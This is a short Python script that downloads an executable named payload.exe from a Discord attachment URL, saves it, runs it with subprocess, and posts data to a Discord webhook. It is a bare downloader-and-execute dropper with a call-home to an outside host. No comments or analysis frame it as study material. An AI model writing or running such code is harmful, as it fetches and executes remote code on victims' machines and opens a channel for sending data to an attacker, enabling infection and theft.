import requests
import subprocess
requests.get("https://cdn.discordapp.com/attachments/987654321234567/987654321234568/payload.exe")
response = requests.get("https://cdn.discordapp.com/attachments/987654321234567/987654321234568/payload.exe")
open("payload.exe", "wb").write(response.content)
requests.post("https://discord.com/api/webhooks/98765432123456789/secret", data={"x": 1})
subprocess.run(["payload.exe"])
